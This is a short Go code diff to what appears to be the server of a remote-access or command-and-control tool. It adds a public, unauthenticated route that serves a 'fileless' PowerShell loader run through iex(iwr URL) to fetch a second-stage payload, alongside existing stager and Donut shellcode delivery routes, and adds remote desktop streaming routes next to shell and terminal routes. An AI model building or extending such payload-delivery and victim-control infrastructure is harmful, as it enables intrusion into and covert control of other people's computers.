@@ -98,6 +98,8 @@ func main() {
 	// 🚀 Public routes (no auth required) - Stager payload delivery
 	adminRouter.GET("/api/s/bin/:id", controllers.HandleServeRawPayload)
 	adminRouter.GET("/api/s/:id", controllers.HandleServePayload)
+	// Fileless loader script — short one-click PS via iex(iwr URL); returns Stage2 loader body
+	adminRouter.GET("/api/s/l/:id", controllers.HandleServeFilelessLoader)
 	// Fileless Stage2 PIC (Donut) — short-TTL cache from /api/stager?delivery=fileless
 	adminRouter.GET("/api/stage2/:id", controllers.HandleServeStage2)
 	adminRouter.GET("/api/s/stage2/:id", controllers.HandleServeStage2)
@@ -145,6 +147,8 @@ func main() {
 
 		api.GET("/shell/:uuid", controllers.HandleAdminShell)
 		api.GET("/pty/:uuid", controllers.StreamPTY)
+		api.GET("/desktop/:uuid/status", controllers.DesktopStatus)
+		api.GET("/desktop/:uuid", controllers.StreamDesktop)
 
 		plugins := api.Group("/plugins")
 		{
